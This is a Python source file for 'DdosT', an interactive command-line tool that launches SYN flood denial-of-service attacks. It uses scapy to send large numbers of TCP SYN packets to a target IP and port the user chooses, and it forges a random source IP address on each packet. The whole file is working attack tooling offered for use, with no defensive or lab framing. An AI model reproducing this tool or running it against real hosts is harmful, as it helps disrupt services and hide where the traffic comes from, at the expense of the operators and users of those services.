import sys
from random import randint
from os import system
import os
import subprocess
import readchar
from scapy.layers.inet import TCP, IP
from scapy.packet import Raw
from scapy.sendrecv import send
import signal

terminal_cursor = "\033[4;37mDdosT\033[0m | $ "


class DdosT:
    def __init__(self):
        self.__get_intro()
        self.attacks = self.DdosAttacks()

    @staticmethod
    def __get_intro():
        try:
            subprocess.run(["figlet", "-v"], stdout=subprocess.DEVNULL)
        except Exception:
            try:
                system("apt-get install figlet")
            except Exception:
                print("figlet module not found")
                exit()
        system("clear")
        print("\033[1;31m")
        subprocess.run(["figlet", "-t", "-c", "-k", "DdosT Project"])
        print("")
        print("\033[1;37m\tMustafa Cuneyt Kafes\n".center(int(os.get_terminal_size()[0])))
        print(
            "\033[1;37m[!] Use the \033[1;32m'help'\033[1;37m command to learn how to use it.\n"
            "\n\033[1;32mIf you want to get more information about the program:\n"
            "\033[1;37mYou can contact me via Discord: Livcon#9961\n")
        print("\033[0m")

    class DdosAttacks:
        def __init__(self, target_ip=None, target_port=None):
            self.RHOST = target_ip
            self.RPORT = target_port
            self.count = 1
            self.p_size = None
            self.__choose_attack()

        @staticmethod
        def __get_help(self):
            print("\nAfter the program is opened, you need to enter which denial of service attack type you want to "
                  "choose. Then, you can check the attack parameters with using 'options' command. If you want to "
                  "change one of them just use 'set {option} {new_value}' command")
            info = {1: ["options", "Check the attack's info", ""],
                    2: ["set", "Change one of the option parameters", "'set {option} {new_value}'"],
                    3: ["types", "Change the attack type of DDoS", ""],
                    4: ["execute", "Start the attack", ""],
                    5: ["help", "Shows help documentation", ""],
                    6: ["exit", "Close the program", ""]}

            # Print the names of the columns.
            print("\n\033[1;37m{:<15} {:<38} {:<15}\n\033[0m".format('COMMAND', 'DESC', 'PARAMS'))

            # print each data item.
            for key, value in info.items():
                attr, desc, params = value
                print("{:<15} {:<38} {:<15}".format(attr, desc, params))
            print("")

        def __choose_attack(self):
            while True:
                print("\033[1;37mAttack Types:\n\033[0m"
                      "[1] - SynFlood\n")
                print("Please choose your DDoS Attack type")
                user_choice = input(terminal_cursor)
                if not user_choice.lower() == "help":
                    try:
                        user_choice = int(user_choice)
                    except Exception:
                        print("\033[1;31mPlease enter a valid value\033[0m\n")
                        continue
                    if user_choice == 1:
                        print("\033[1;32mAttack type selected as SynFlood\033[0m\n")
                        terminal_result = self.__terminal()
                        if not terminal_result:
                            continue
                        attack_result = self.syn_flood(self.count, self.p_size)
                        if not attack_result:
                            return
                        else:
                            continue
                    else:
                        print("\033[1;31mPlease enter a valid value\033[0m\n")
                else:
                    self.__get_help(self)

        def __terminal(self):
            while True:
                command = input(terminal_cursor)
                if command == "options":
                    info = {1: ["RHOST", str(self.RHOST), "Target IP Address"],
                            2: ["RPORT", str(self.RPORT), "Target Port Number"],
                            3: ["COUNT", str(self.count), "Number of Packets"],
                            4: ["SIZE", str(self.p_size), "Size of Packets"]}

                    # Print the names of the columns.
                    print("\n\033[1;37m{:<15} {:<15} {:<15}\n\033[0m".format('ATTR', 'VALUE', 'DESC'))

                    # print each data item.
                    for key, value in info.items():
                        attr, val, desc = value
                        print("{:<15} {:<15} {:<15}".format(attr, val, desc))
                    print("")
                elif command == "help":
                    self.__get_help(self)
                elif command == "execute":
                    return True
                elif command == "types":
                    print("")
                    return False
                elif command.split(" ")[0] == "set":
                    if command.split(" ")[1].lower() == "rhost":
                        try:
                            self.RHOST = command.split(" ")[2]
                        except Exception:
                            print("\033[1;31mPlease enter a valid value\033[0m\n")
                    elif command.split(" ")[1].lower() == "rport":
                        try:
                            new_port = int(command.split(" ")[2])
                            if 0 <= new_port <= 65535:
                                self.RPORT = new_port
                            else:
                                print("\033[1;31mPlease enter a valid value\033[0m\n")
                        except Exception:
                            print("\033[1;31mPlease enter a valid value\033[0m\n")
                    elif command.split(" ")[1].lower() == "count":
                        try:
                            new_count = int(command.split(" ")[2])
                            if 0 < new_count < 999999:
                                self.count = new_count
                            else:
                                print("\033[1;31mPlease enter a valid value\033[0m\n")
                        except Exception:
                            print("\033[1;31mPlease enter a valid value\033[0m\n")
                    elif command.split(" ")[1].lower() == "size" or command.split(" ")[1].upper() == "SIZE":
                        try:
                            new_size = int(command.split(" ")[2])
                            if 0 < new_size < 1000:
                                self.p_size = new_size
                            else:
                                print("\033[1;31mPlease enter a valid value\033[0m\n")
                        except Exception:
                            print("\033[1;31mPlease enter a valid value\033[0m\n")
                    else:
                        print("\n\033[1;37m[!] Use the \033[1;32m'help'\033[1;37m command to learn how to use it.\n\033[0m")
                else:
                    print("\n\033[1;37m[!] Use the \033[1;32m'help'\033[1;37m command to learn how to use it.\n\033[0m")

        def set_target_info(self, target_ip, target_port):
            self.RHOST = target_ip
            self.RPORT = target_port

        # fake ip generator
        def generate_ip(self):
            ip = ".".join(map(str, (randint(0, 255) for i in range(4))))
            return ip

        def syn_flood(self, count, size):
            total_sent = 0
            total_bytes = 0
            system("clear")
            for i in range(0, count):
                LHOST = self.generate_ip()
                LPORT = randint(1000, 9000)
                ip = IP(src=LHOST, dst=self.RHOST)
                tcp = TCP(sport=LPORT, dport=self.RPORT, flags="S", seq=randint(1000, 9000),
                          window=randint(1000, 9000))
                if size is not None:
                    raw = Raw(b"X" * size)
                    bytes = 8 * size
                    total_bytes += bytes
                    send(ip / tcp / raw, verbose=0)
                else:
                    rand_size = randint(1, 7)
                    raw = Raw(b"X" * rand_size)
                    bytes = 8 * rand_size
                    total_bytes += bytes
                    send(ip / tcp, verbose=0)
                print("SYN Request packet sent ({} bytes)".format(bytes))
                total_sent += 1
            print("\n\033[1;32mTotal of {} request packages in {} bytes sent\033[0m\n".format(total_sent, total_bytes))
            while True:
                usr_choice = input("Would you like to continue ? (Y/n) : ")
                print("")
                if usr_choice == "" or usr_choice.lower() == "y":
                    return True
                elif usr_choice.lower() == "n":
                    return False
                else:
                    continue


def handler(signum, frame):
    msg = "\n\033[1;31mCTRL+C was pressed.\033[0m Do you really want to exit ? (y/n) "
    print(msg, end="", flush=True)
    res = readchar.readchar()
    if res == 'y':
        print("")
        exit(1)
    else:
        print("", end="\r", flush=True)
        print(" " * (len(msg)+10), end="", flush=True) # clear the printed line
        print("    ", end="\r", flush=True)
        sys.stdout.write('\r' + terminal_cursor)


signal.signal(signal.SIGINT, handler)

ddos = DdosT()
